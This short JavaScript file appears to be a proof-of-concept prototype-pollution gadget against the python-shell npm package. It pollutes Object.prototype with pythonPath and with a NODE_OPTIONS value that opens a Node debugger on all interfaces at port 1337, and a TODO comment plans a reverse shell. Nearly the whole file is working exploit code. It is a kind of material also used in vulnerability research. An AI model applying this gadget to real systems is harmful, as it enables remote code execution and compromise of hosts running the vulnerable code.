const { PythonShell } = require('python-shell');

// We can control
// - running process name by `pythonPath` and `shell`
// - additinal arguments after .py file by `args`
// - all enviroment variables by `env` and specific one by `<name-of-env-var>`

// TODO: try to run a reverse shell
const nodePath = process.argv0;
Object.prototype.pythonPath = nodePath; // or .shell
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

PythonShell.runString('x=1+1;print(x)', null).then(messages=>{
  console.log('finished');
});